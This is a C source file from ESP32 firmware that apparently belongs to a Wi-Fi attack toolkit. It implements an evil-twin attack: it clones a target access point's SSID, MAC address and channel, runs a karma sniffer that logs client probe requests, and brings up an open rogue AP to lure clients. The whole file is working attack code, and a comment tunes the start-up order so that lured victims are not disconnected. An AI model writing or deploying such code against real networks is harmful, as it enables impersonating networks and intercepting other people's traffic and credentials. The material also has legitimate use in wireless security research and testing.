/**
 * @file attack_evil_twin.c
 * @brief Implements the rogue AP / evil twin attack.
 */
#include "attack_evil_twin.h"

#include <stdbool.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "karma.h"

static const char *TAG = "attack_evil_twin";

static bool running = false;
static wifi_ap_record_t target_ap_record;

void attack_evil_twin_start(const wifi_ap_record_t *ap_record) {
    if (running) {
        ESP_LOGW(TAG, "Evil twin attack already running, stop it first");
        return;
    }
    ESP_LOGI(TAG, "Starting evil twin attack against '%s'...", ap_record->ssid);
    memcpy(&target_ap_record, ap_record, sizeof(target_ap_record));

    wifictl_set_ap_mac(ap_record->bssid);

    // Start the karma sniffer before the rogue AP comes up: wifictl_sniffer_start()
    // kicks any STA currently on our AP as a channel-switch safety step, which
    // would immediately boot the very clients we're trying to lure in.
    karma_start(ap_record->primary, ap_record->bssid);

    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *) ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
        },
    };
    memcpy(ap_config.ap.ssid, ap_record->ssid, sizeof(ap_config.ap.ssid));
    wifictl_ap_start(&ap_config);

    running = true;
}

void attack_evil_twin_stop() {
    if (!running) {
        return;
    }
    karma_stop();
    wifictl_ap_stop();
    wifictl_restore_ap_mac();
    running = false;
    ESP_LOGI(TAG, "Evil twin attack stopped");
}

const wifi_ap_record_t *attack_evil_twin_get_target() {
    return running ? &target_ap_record : NULL;
}

unsigned attack_evil_twin_get_probe_log(karma_probe_t *out, unsigned max_count) {
    return karma_get_log(out, max_count);
}
